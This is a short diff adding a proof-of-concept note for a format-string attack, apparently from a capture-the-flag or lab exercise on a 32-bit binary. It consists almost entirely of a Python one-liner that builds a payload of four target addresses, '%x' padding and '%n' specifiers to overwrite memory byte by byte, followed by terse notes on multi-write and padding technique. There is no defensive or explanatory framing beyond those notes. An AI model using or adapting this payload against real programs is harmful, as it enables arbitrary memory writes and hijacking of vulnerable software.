@@ -1,0 +1,9 @@
+POC:
+python -c 'print "\xf4\x96\x04\x08"+"%x"*10+"%11x%n"+"BB"+"\xf5\x96\x04\x08"+"%x"*6+"%475x%n"+"B"+"\xf6\x96\x04\x08"+"%x"*4+"%136x%n"+"B"+"\xf7\x96\x04\x08"+"%x"*3+"%482x%n"'
+
+Note:
+Multi write to mem
+Use padding
+Use bigger number to write onebyte (dest max is ff, 255),but can write more
+
+
